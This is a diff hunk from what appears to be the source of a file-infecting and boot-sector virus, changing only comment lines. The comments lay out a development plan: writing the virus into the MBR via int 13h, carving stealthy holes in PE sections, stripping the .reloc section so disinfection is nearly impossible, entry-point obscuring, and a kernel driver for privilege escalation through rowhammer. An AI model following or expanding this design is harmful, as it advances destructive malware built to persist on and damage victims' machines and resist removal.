@@ -11,8 +11,8 @@
 ; - bootloader will save the virus to the mbr by using int 13h / ah 02/3 to cylinder 25,
 ; sector 1, either head 0 or head 1. If we are going to kill the MBR we may as well save it to 
 ; head 2 since on head 0 the MBR exists. 
-; - Infect will be updated so it able to make virtual/physical "holes" in the .text or 
-; CODE section. Then modify to situate the holes at the end of the other sections, which will 
+; - Infect.inc will be updated so it able to make virtual/physical "holes" in the .text or 
+; section. Then modify to situate the holes at the end of the other sections, which will 
 ; be stealthy. Then, remove the .reloc section from the executable, so disinfection is nearly
 ; impossible.  This will be accomplished through the uep insertion.
 ; - kernel-mode driver/loader that will act as our privilege escalation w/row-hammering
